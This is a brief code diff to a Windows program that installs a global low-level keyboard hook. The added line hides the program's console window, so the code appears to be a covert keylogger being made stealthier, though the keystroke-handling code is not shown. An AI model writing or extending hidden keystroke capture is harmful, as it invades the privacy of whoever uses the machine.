@@ -62,6 +62,7 @@ int main()
     HHOOK hook_keyboard = SetWindowsHookEx( WH_KEYBOARD_LL, ll_keyboardproc, 0, 0);
 
     MSG msg;
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
     while (!GetMessage(&msg, NULL, NULL, NULL))
     {
         TranslateMessage(&msg);
